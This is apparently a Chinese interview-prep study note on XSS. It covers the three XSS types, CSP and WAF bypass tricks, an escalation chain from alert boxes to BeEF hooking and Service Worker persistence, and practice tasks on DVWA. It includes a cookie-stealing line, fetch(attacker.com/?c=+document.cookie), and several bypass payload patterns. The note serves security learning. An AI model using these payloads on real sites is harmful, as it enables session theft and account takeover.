# Day 6：XSS跨站脚本攻击
> [XSS面试核心] 反射型/存储型/DOM型XSS区别/CSP绕过/WAF绕过/利用升级链
## 核心知识点
### Q: 三种XSS的本质区别和各自检测方法
反射型：Payload经过服务器端返回(在HTTP Response中)→用Burp/浏览器DevTools看Response。典型payload在URL参数中
存储型：Payload存入数据库→所有访问该页面的用户受影响→测试时检查评论/留言/用户资料等所有可存储输入的地方
DOM型：Payload不经过服务器→全在客户端JS中发生→检查Sources(用户可控输入)→Sinks(innerHTML/eval/document.write)的数据流。工具：Burp DOM Invader

面试扣分：说'XSS就是弹窗'——面试官想听你讲从弹窗到接管账号的完整攻击升级链
### Q: XSS绕过CSP的常见技巧
CSP不是银弹：①JSONP端点劫持(如果script-src允许了某个CDN且有JSONP回调→可执行任意JS) ②AngularJS沙箱逃逸(低版本Angular的模板注入) ③script-src unsafe-eval→eval可执行任意JS ④script-src unsafe-inline→等于没开 ⑤DNS Prefetch外传数据(link rel=dns-prefetch将窃取的数据编码为子域名) ⑥base标签劫持(注入<base href=attacker.com>→相对路径资源走攻击者服务器)

最强CSP：nonce+hash+strict-dynamic
### Q: XSS利用升级链：从弹窗到完全控制
Level 1(弹窗)：alert(1)证明存在。Level 2(Cookie窃取)：fetch(attacker.com/?c=+document.cookie)→HttpOnly防但非HttpOnly的Cookie可窃取。Level 3(CSRF绕过)：XSS读CSRF Token→以受害者身份发起任意操作。Level 4(凭证钓鱼)：注入逼真登录框→用户输入密码。Level 5(全浏览器劫持)：BeEF框架建立C2→键盘记录/截图/内网扫描。Level 6(持久化后门)：Service Worker注册→页面刷新/XSS修复后仍存活
### Q: XSS绕过现代WAF的常用手法
①编码混淆：HTML实体/URL/Unicode混用 ②标签变换：<svg onload=>代替<script> ③协议变换：<a href=jAvAsCrIpT:...> ④DOM Clobbering：利用HTML id属性覆盖JS变量 ⑤mXSS(Mutation XSS)：利用浏览器HTML清洗器和渲染引擎解析差异 ⑥Prototype Pollution→污染JS原型链→间接导致XSS

面试强调：绕过WAF不是目的，理解WAF检测逻辑并构造在语义上等价但形式上绕过的手段才体现深度
## 面试陷阱
- XSS不只是弹窗——能描述完整利用链(STS/CSRF绕过/凭证钓鱼/BeEF/Service Worker)说明你理解深度
- CSP不能完全依赖——nonce+strict-dynamic是最强配置但有兼容性问题
- 只讲Web不讲移动端——Hybrid App的WebView同样存在XSS，Referer在移动端可能泄露Token

## 今日检测
1. 本地DVWA测试所有XSS注入点→从弹窗升级到Cookie窃取
2. 用CSP Evaluator测试你的Payload能否绕过目标CSP
3. 阅读PortSwigger XSS Cheat Sheet→Burp Suite中验证5条Payload
